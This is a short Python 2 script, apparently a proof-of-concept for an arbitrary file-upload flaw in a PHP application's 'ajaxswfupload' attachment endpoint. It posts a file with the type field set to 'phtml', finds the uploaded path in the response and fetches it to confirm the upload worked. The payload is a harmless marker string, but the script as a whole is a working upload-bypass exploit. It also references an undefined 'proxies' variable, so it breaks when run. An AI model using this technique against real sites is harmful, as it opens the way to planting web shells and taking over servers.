# -*- coding: utf-8 -*-
"""
author: janes
"""

import re
import urlparse
 
import requests


base_url = 'http://127.0.0.1:8000/'

url = urlparse.urljoin(base_url, 'index.php?c=attachment&a=ajaxswfupload')

payload = 'c0ntent'
files = {
    'Filedata': ('123.txt', payload, 'application/octet-stream')
}
data = {
    'type': 'phtml',
    'size': '100',
    'submit': 'submit'
}

resp = requests.post(url, data=data, files=files, proxies=proxies)

if resp.status_code == 200 and 'uploadfiles/file' in resp.content:
    print 'upload success'
    match = re.search(r'uploadfiles/file/.*?txt', resp.content)
    if match:
        path = match.group()
        url = urlparse.urljoin(base_url, path)
        resp = requests.get(url)
        if resp.status_code == 200 and payload in resp.content:
            print "file exist"
else:
    print "upload failed"